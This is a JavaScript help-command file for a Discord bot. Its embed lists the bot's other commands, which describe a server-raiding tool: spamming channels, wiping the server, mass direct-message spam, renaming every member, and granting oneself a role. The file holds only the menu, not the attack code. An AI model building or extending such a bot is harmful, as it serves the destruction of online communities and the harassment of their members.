const Discord = require("discord.js");
const color = "#007fff";
const client = new Discord.Client();

module.exports.run = async (client, message, args) => {
  var embed = new Discord.MessageEmbed()
    .setAuthor("Commande Du bot", message.author.displayAvatarURL)
    .setDescription("Prefix du bot $")
    .addFields(
      { name: "$leave", value: "bot leave discord" },
      { name: "$chan", value: "spam new channels" },
      { name: "$destruct", value: "clear the discord" },
      { name: "$droleSpam", value: "spam in mp" },
      { name: "$invite", value: "invite bot" },
      { name: "$name", value: "change name discord" },
      { name: "$mp", value: "send message for everyone in mp" },
      { name: "$renameALL", value: "rename everyone {H.S}" },
      { name: "$server", value: "list server who use the bot" },
      { name: "$setgame", value: "change le jeu du bot" },
      { name: "$gmod", value: "crete role and get {H.S}" }
    );
  message.channel.send(embed); //message.author.username
};

module.exports.help = {
  name: "helpA",
};
